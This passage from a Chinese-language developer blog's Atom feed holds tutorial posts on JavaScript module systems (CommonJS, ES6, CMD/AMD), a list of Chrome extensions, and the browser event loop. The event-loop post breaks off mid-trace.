class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 引用自定义的模块时，参数包含路径，可省略.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">math.add(2, 5);</span><br><span class="line"></span><br><span class="line">// 引用核心模块时，不需要带路径</span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">http.createService(...).listen(3000);</span><br></pre></td></tr></table></figure><blockquote><p>目录的加载规则</p></blockquote><p>在目录中放置一个package.json文件，并且将入口文件写入main字段。下面是一个例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// package.json</span><br><span class="line">&#123; &quot;name&quot; : &quot;some-library&quot;,</span><br><span class="line">  &quot;main&quot; : &quot;./lib/some-library.js&quot; &#125;</span><br></pre></td></tr></table></figure><h3 id="module对象"><a href="#module对象" class="headerlink" title="module对象"></a>module对象</h3><p>Node内部提供一个Module构建函数。所有模块都是Module的实例。</p><ul><li>module.id 模块的识别符，通常是带有绝对路径的模块文件名。</li><li>module.filename 模块的文件名，带有绝对路径。</li><li>module.loaded 返回一个布尔值，表示模块是否已经完成加载。</li><li>module.parent 返回一个对象，表示调用该模块的模块。</li><li>module.children 返回一个数组，表示该模块要用到的其他模块。</li><li>module.exports 表示模块对外输出的值。</li></ul><h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><p>模块功能主要由两个命令构成：<strong>export</strong>和<strong>import</strong>。<strong>export</strong>命令用于规定模块的对外接口，<strong>import</strong>命令用于输入其他模块提供的功能。</p><p>一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;module&quot;&gt;</span><br><span class="line">  import utils from &quot;./utils.js&quot;;</span><br><span class="line"></span><br><span class="line">  // other code</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h3><blockquote><p>它们有两个重大差异</p></blockquote><ul><li>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</li><li>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</li></ul><h4 id="ES6-模块加载-CommonJS-模块"><a href="#ES6-模块加载-CommonJS-模块" class="headerlink" title="ES6 模块加载 CommonJS 模块"></a>ES6 模块加载 CommonJS 模块</h4><p>CommonJS 模块的输出都定义在module.exports这个属性上面。Node 的import命令加载 CommonJS 模块，Node 会自动将module.exports属性，当作模块的默认输出，即等同于export default xxx。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// a.js</span><br><span class="line">module.exports = &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 等同于</span><br><span class="line">export default &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一共有三种写法，可以拿到 CommonJS 模块的module.exports。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 写法一</span><br><span class="line">import baz from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// 写法二</span><br><span class="line">import &#123;default as baz&#125; from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// 写法三</span><br><span class="line">import * as baz from &apos;./a&apos;;</span><br></pre></td></tr></table></figure><h4 id="CommonJS-模块加载-ES6-模块"><a href="#CommonJS-模块加载-ES6-模块" class="headerlink" title="CommonJS 模块加载 ES6 模块"></a>CommonJS 模块加载 ES6 模块</h4><p>CommonJS 模块加载 ES6 模块，不能使用require命令，而要使用import()函数。ES6 模块的所有输出接口，会成为输入对象的属性。</p><h3 id="导出模块-1"><a href="#导出模块-1" class="headerlink" title="导出模块"></a>导出模块</h3><h4 id="导出方式"><a href="#导出方式" class="headerlink" title="导出方式"></a>导出方式</h4><p>1、多次使用export</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">export var firstName = &apos;Michael&apos;;</span><br><span class="line">export var lastName = &apos;Jackson&apos;;</span><br><span class="line">export var year = 1958;</span><br></pre></td></tr></table></figure><p>export命令对外部输出了三个变量。</p><p>2、导出对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">var firstName = &apos;Michael&apos;;</span><br><span class="line">var lastName = &apos;Jackson&apos;;</span><br><span class="line">var year = 1958;</span><br><span class="line"></span><br><span class="line">export &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure><p>3、直接导出单个变量、函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function multiply(x, y) &#123;</span><br><span class="line">  return x * y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>4、导出默认模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 正确</span><br><span class="line">export var a = 1;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">var a = 1;</span><br><span class="line">export default a;</span><br><span class="line"></span><br><span class="line">// 错误</span><br><span class="line">export default var a = 1;</span><br></pre></td></tr></table></figure><h4 id="导出注意点"><a href="#导出注意点" class="headerlink" title="导出注意点"></a>导出注意点</h4><p><strong>export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。</strong>(简而言之导出的必须是对象的key)</p><blockquote><p>必须建议意义对应关系</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export var year = 1958;</span><br><span class="line">//==</span><br><span class="line">export &#123;</span><br><span class="line">    year</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 报错</span><br><span class="line">export 1;</span><br><span class="line">// 报错</span><br><span class="line">var m = 1;</span><br><span class="line">export m;</span><br></pre></td></tr></table></figure><blockquote><p>上面两种写法都会报错，因为没有提供对外的接口。正确写法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 写法一</span><br><span class="line">export var m = 1;</span><br><span class="line"></span><br><span class="line">// 写法二</span><br><span class="line">var m = 1;</span><br><span class="line">export &#123;m&#125;;</span><br><span class="line"></span><br><span class="line">// 写法三</span><br><span class="line">var n = 1;</span><br><span class="line">export &#123;n as m&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>同样的，function和class的输出，也必须遵守这样的写法。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 报错</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export f;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">export function f() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">// 正确</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export &#123;f&#125;;</span><br></pre></td></tr></table></figure><p><strong>另外，export语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。</strong></p><h4 id="模块别名"><a href="#模块别名" class="headerlink" title="模块别名"></a>模块别名</h4><p>浏览器加载 <strong>ES6</strong> 模块，也使用<strong><code>&lt;script&gt;</code></strong>标签，但是要加入<strong>type=”module”</strong>属性</p><p>浏览器对于带有<strong>type=”module”</strong>的<strong><code>&lt;script&gt;</code></strong>，等同于打开了<strong><code>&lt;script&gt;</code>标签的defer</strong>属性。</p><blockquote><p>ES6 模块也允许内嵌在网页中</p></blockquote><ul><li>代码是在模块作用域之中运行，而不是在全局作用域运行。模块内部的顶层变量，外部不可见。</li><li>模块脚本自动采用严格模式，不管有没有声明use strict。</li><li>模块之中，可以使用import命令加载其他模块（.js后缀不可省略，需要提供绝对 URL 或相对 URL），也可以使用export命令输出对外接口。</li><li>模块之中，顶层的this关键字返回undefined，而不是指向window。也就是说，在模块顶层使用this关键字，是无意义的。</li><li>同一个模块如果加载多次，将只执行一次。</li></ul><blockquote><p>示例模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import utils from &apos;https://example.com/js/utils.js&apos;;</span><br><span class="line"></span><br><span class="line">const x = 1;</span><br><span class="line"></span><br><span class="line">console.log(x === window.x); //false</span><br><span class="line">console.log(this === undefined); // true</span><br></pre></td></tr></table></figure><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>使用export命令定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// main.js</span><br><span class="line">import &#123;firstName, lastName, year&#125; from &apos;./profile.js&apos;;</span><br><span class="line"></span><br><span class="line">function setName(element) &#123;</span><br><span class="line">  element.textContent = firstName + &apos; &apos; + lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，import命令具有提升效果，会提升到整个模块的头部，首先执行。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class="line"></span><br><span class="line">// ===&gt;</span><br><span class="line"></span><br><span class="line">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><blockquote><p>导入默认模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// export-default.js</span><br><span class="line">export default function () &#123;</span><br><span class="line">  console.log(&apos;foo&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// import-default.js</span><br><span class="line">import customName from &apos;./export-default&apos;;</span><br><span class="line">customName(); // &apos;foo&apos;</span><br></pre></td></tr></table></figure><h4 id="导入别名设置"><a href="#导入别名设置" class="headerlink" title="导入别名设置"></a>导入别名设置</h4><p>将surname是lastName的别名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; lastName as surname &#125; from &apos;./profile.js&apos;;</span><br></pre></td></tr></table></figure><p>将多个方法融合成一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// circle.js</span><br><span class="line"></span><br><span class="line">export function area(radius) &#123;</span><br><span class="line">  return Math.PI * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function circumference(radius) &#123;</span><br><span class="line">  return 2 * Math.PI * radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import * as circle from &apos;./circle&apos;;</span><br><span class="line"></span><br><span class="line">console.log(&apos;圆面积：&apos; + circle.area(4));</span><br><span class="line">console.log(&apos;圆周长：&apos; + circle.circumference(14));</span><br></pre></td></tr></table></figure><h4 id="按需加载"><a href="#按需加载" class="headerlink" title="按需加载"></a>按需加载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import(&apos;./utils.js&apos;)</span><br><span class="line">.then(Util =&gt; &#123;</span><br><span class="line">    console.log(Util);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>CMD(common module definition), 是sea.js在推广过程中对模块定义的规范化产出，主要用于浏览器端。推崇依赖就近、延迟执行。它的核心思想是：每个文件都是一个模块，在模块中定义的变量、函数、类都是私有的，对外不可见。有一个全局性方法require()，用于加载模块</p><p>AMD规范（Asynchronous Module Definition）：是 RequireJS 在推广过程中对模块定义的规范化产出，也是主要用于浏览器端。其特点是：依赖前置，需要在定义时就写好需要的依赖，提前执行依赖，应用有require.js</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://javascript.ruanyifeng.com/nodejs/module.html#toc0" target="_blank" rel="noopener">CommonJS规范</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在学习新一个东西前，最好的办法是了解它能给我们带来什么好处我们为什么学习它，从而激发学习兴趣，哈哈哈~又扯了一堆，下面进入我们前端模块化探索之旅吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;模块化的历史&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在正式进入模块化学习前我们来了解一下前端模块化的前生今世。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>chrome常用插件</title>
    <link href="http://zhoushaw.github.io/2019/03/16/other/tool/chrome-extend/"/>
    <id>http://zhoushaw.github.io/2019/03/16/other/tool/chrome-extend/</id>
    <published>2019-03-16T03:08:32.000Z</published>
    <updated>2019-04-20T12:39:57.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>chrome可以称之为前端开发者的神器，不管是开发还是调试。并且chrome给用户带来的体验简直QAQ，chrome插件无疑会大大提供工作效率，这里将会列出个人常用的chrome插件</p><div><a id="more"></a></div><h2 id="插件列表"><a href="#插件列表" class="headerlink" title="插件列表"></a>插件列表</h2><blockquote><p>Fair AdBlocker</p></blockquote><p>远离那些讨厌的广告吧。<br>右击选中对应命令，点击要消除的element，即可永久消除对应的AdBlocker。</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190316_2a13j39fgc4a8l7db14kh8438jekg_648x398.png" alt=""></p><p>总结来说:嗯！真香</p><blockquote><p>Infinity</p></blockquote><p>Infinity,超棒的无广告，体验好的。导航页</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190316_0l5glj75lb0b6fb6hdf727ea1ij7f_1235x860.png" alt=""></p><blockquote><p>Allow-Control-Allow-Origin</p></blockquote><p>解决跨域神器。有时候后端跟你说，线下不支持跨域？？没办法自己支持吧，就用这个神器</p><blockquote><p>Tampermonkey</p></blockquote><p>俗称为猴油浏览器插件，支持第三方JS注入，实现比较酷炫的事情。<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_122h6g0jhf8c2353fga0gaecb51ee_2494x556.png" alt=""></p><p>下面列举一下：</p><ul><li>豆瓣资源大师<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_4g6gk82abld135e11d57gi7b90g77_2472x1330.png" alt=""></li><li>百度云下载助手<br><img src="https://s10.mogucdn.com/mlcdn/c45406/190419_4b5l6ahibd5cgfdd4cj7dc3e76bcb_1966x1296.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;chrome可以称之为前端开发者的神器，不管是开发还是调试。并且chrome给用户带来的体验简直QAQ，chrome插件无疑会大大提供工作效率，这里将会列出个人常用的chrome插件&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="tool" scheme="http://zhoushaw.github.io/categories/tool/"/>
    
    
      <category term="chrome" scheme="http://zhoushaw.github.io/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>Event loop</title>
    <link href="http://zhoushaw.github.io/2019/03/01/learning/font-end/event%20loop/"/>
    <id>http://zhoushaw.github.io/2019/03/01/learning/font-end/event loop/</id>
    <published>2019-02-28T20:36:35.000Z</published>
    <updated>2019-04-14T13:54:11.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>请问下面输出的结果是什么</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(function() &#123;</span><br><span class="line">  console.log(&apos;promise1&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure><p>纳尼？？仿佛又回想了当初被面试官支配时的恐惧了！！</p><p>骚年稳住别慌，这道面试题考察的是你对Event loop事件循环的理解，当你深入了解浏览器或Node中如何处理事件循环的时候，上面此类题目对你来说就是so easy，好了话不多说让我们快速进入正题吧。</p><div><a id="more"></a></div><h2 id="Event-loop"><a href="#Event-loop" class="headerlink" title="Event loop"></a>Event loop</h2><blockquote><p>是什么</p></blockquote><p><strong>Event loop</strong>即事件循环，是浏览器和Node环境中运行<strong>单线程JavaScript</strong>一种不阻塞运行的一种机制。也就是我们常常称之为的异步的原理。</p><blockquote><p>有什么作用</p></blockquote><ul><li><p>类似于上面问答中的代码，一般情况下是不会产生的。但是由于一些业务场景迫使我们<strong>不可避免的编写出多个异步事件</strong>，而我们对其<strong>运行顺序不知其所以然</strong>，难免会造成不必要的困扰</p></li><li><p>当然Event loop也是面试场上的常胜将军，大多数同学都<strong>折戟于此</strong></p></li><li><p>市场上框架、新技术层出不穷，想要在风云突变的战场上稳住脚跟就必须<strong>修炼好内功</strong>，了解一些底层原理无非是非常好的路径</p></li></ul><h2 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h2><p>在正式Event loop讲解前，我们先回顾一下基本数据结构知识</p><blockquote><p>队列</p></blockquote><p>队列是一种操作受限制的线性表，它只运行从<strong>表的前端(front)</strong>进行删除操作，<strong>表的后端(rear)</strong>进行添加操作。</p><p>进行删除操作的称之为<strong>表头</strong>，添加操作的称之为<strong>表尾</strong>，空的队列称之为<strong>空队列</strong>。</p><p>队列的线性结构赋予<strong>其先进先出</strong>的特性</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190301_80cgh13fd23fjkahjd296l7ig9e68_1152x241.jpg" alt=""></p><blockquote><p>栈</p></blockquote><p>栈是一种操作受限制的线性表，它只运行从表的<strong>尾端(rear)</strong>进行<strong>添加操作和删除操作</strong></p><p>栈的限制结构赋予其<strong>先进后出</strong>的特性</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190301_3g51f9k9h099ga3lecj98d6adchh5_1344x752.jpg" alt=""></p><h2 id="Event-loop任务"><a href="#Event-loop任务" class="headerlink" title="Event loop任务"></a>Event loop任务</h2><p>在JavaScript中，会将执行的任务分为两类，一种是<strong>宏任务</strong>(MacroTask)简称为<strong>Task</strong>,另一种是<strong>微任务</strong>(MicroTask)</p><blockquote><p>宏任务类型</p></blockquote><p><strong>script全部代码</strong>、<strong>setTimeout</strong>、<strong>setInterval</strong>、<strong>I/O</strong>、<strong>UI Rendering</strong></p><blockquote><p>微任务</p></blockquote><p><strong>Process.nextTick</strong>（Node独有）、<strong>Promise</strong>、<strong>MutationObserver</strong></p><h2 id="浏览器Event-loop"><a href="#浏览器Event-loop" class="headerlink" title="浏览器Event loop"></a>浏览器Event loop</h2><p>在JavaScript中有一个<strong>主线程</strong>(main thread) 和<strong>调用栈</strong> (call-stack) ,所有任务都会被放到调用栈等待主线程执行。</p><blockquote><p>JS调用栈</p></blockquote><p>JS调用栈采用栈结构，是先进后出规则，当函数执行的时候会放到栈的顶部，当函数执行完成会将函数从栈顶移除，遇到新函数会新函数将推入栈内，执行完成从栈顶移除，直到栈被清空</p><p>列如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function task1 () &#123;</span><br><span class="line">    console.log(&apos;task1&apos;);</span><br><span class="line">&#125;</span><br><span class="line">function task2 () &#123;</span><br><span class="line">    task1();</span><br><span class="line">    console.log(&apos;hello world&apos;);</span><br><span class="line">&#125;</span><br><span class="line">task2();</span><br></pre></td></tr></table></figure><p>执行到task1()时，栈内容为:task2 task1，依次执行并移除task1、task2</p><blockquote><p>同步任务和异步任务</p></blockquote><p>在JavaScript将任务分为同步任务和异步任务，同步任务将依次放入调用栈中按照先进后出的规则，放入主线程执行。异步任务则是等待执行结果返回后放入任务队列中等待主线程空闲时(调用栈为空时，同步任务被执行完成时)，被读取到调用栈内等待主线程执行。</p><p>简单来说可以将其区域分为三个区域:</p><ul><li>任务队列区</li><li>主线程执行区</li><li>MacroTask区</li><li>MicroTask区</li></ul><blockquote><p>任务之间执行顺序</p></blockquote><p>JavaScript代码在运行时，主线程顺序执行代码，按照栈的结构先进后出，将微任务存入微任务区，宏任务存入宏任务区。</p><p>##<br>当任务队列任务为空时，将会查看MicroTask区队列是否为空，若为空则查询MacroTask区并执行。若不为空则执行MicroTask区任务，若遇到任务中存在MacroTask将存入MacroTask区队尾。执行MicroTask任务完成后将，执行MacroTask区任务</p><h2 id="解答文章头部提出的问题"><a href="#解答文章头部提出的问题" class="headerlink" title="解答文章头部提出的问题"></a>解答文章头部提出的问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(function() &#123;</span><br><span class="line">  console.log(&apos;promise1&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure><p>JavaScript在运行这段代码逐行执行，按照调用栈、宏任务、微任务执行过程如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#过程一:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log: script start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#过程二:</span><br><span class="line"></span><br><span class="line">MicroTask: Promise.then</span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log: script start</span><br><span class="line"></span><br><span class="line">#过程三:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: Promise.then</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end</span><br><span class="line"></span><br><span class="line">#过程四:</span><br><span class="line"></span><br><span class="line">MicroTask: Promise.then promise2</span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1</span><br><span class="line"></span><br><span class="line">#过程五:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: Promise.then promise2</span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1</span><br><span class="line"></span><br><span class="line">#过程五:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask: setTimeout</span><br><span class="line"></span><br><span class="line">call-Task: </span><br><span class="line"></span><br><span class="line">Log:  script start、 script end、promise1、promise2</span><br><span class="line"></span><br><span class="line">#过程六:</span><br><span class="line"></span><br><span class="line">MicroTask: </span><br><span class="line">MacroTask:</span><br><span class="line"></span><br><span class="line">call-Task: 